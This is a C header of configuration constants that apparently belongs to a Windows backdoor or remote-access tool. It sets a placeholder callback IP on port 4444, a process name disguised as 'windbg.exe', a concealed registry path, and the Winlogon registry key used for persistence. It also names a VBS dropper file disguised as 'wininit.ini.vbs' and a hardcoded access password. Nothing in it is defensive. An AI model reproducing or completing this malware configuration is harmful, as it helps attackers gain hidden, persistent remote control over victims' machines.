#ifndef WINCONSTS
#define WINCONSTS
#define IP "<IP ADDRESS HERE>" // IP ADDRESS
#define PORT 4444
#define PROC_NAME "windbg.exe"
#define MAIN_REGISTRY "Software\\AppData\\Internal"
#define ACTIVATE_REGISTRY "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
#define VBS_PATH "C:\\Users\\Public\\wininit.ini.vbs" 
#define WHEEL_RATE 300000
#define REACTION_SPEED_REQ 300
#define PASS "whatisthat"
#if 0 // Debug
#define DBG(x) OutputDebugStringA(x)
#else 
#define DBG(x)
#endif
#endif